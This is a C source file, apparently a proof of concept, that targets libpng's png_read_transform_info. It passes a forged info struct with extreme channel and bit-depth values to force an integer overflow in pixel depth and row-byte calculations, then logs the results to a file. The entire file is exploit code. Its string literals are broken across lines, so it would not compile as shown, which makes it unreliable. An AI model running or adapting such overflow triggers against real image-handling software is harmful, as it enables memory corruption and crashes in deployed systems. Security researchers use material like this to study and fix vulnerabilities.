#include <stdio.h>
#include <stdlib.h>
#include <png.h>

// Forward declaration of the vulnerable function
void png_read_transform_info(png_structp png_ptr, png_infop info_ptr);

// Define a fake info struct to simulate overflow
typedef struct {
    unsigned int width;
    unsigned int channels;
    unsigned int bit_depth;
    unsigned int pixel_depth;
    size_t rowbytes;
} fake_info_t;

int main() {
    png_structp png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) {
        fprintf(stderr, "Failed to create png_struct
");
        return 1;
    }
    fake_info_t info;
    info.width = 1;
    info.channels = 100000;
    info.bit_depth = 100000;
    // Cast fake_info_t pointer to png_infop to call vulnerable function
    png_read_transform_info(png_ptr, (png_infop)&info);
    FILE *f = fopen("poc/libpng/input.txt", "w");
    if (f) {
        fprintf(f, "pixel_depth: %u
", info.pixel_depth);
        fprintf(f, "rowbytes: %zu
", info.rowbytes);
        fclose(f);
    } else {
        fprintf(stderr, "Failed to open output file
");
    }
    png_destroy_read_struct(&png_ptr, NULL, NULL);
    return 0;
}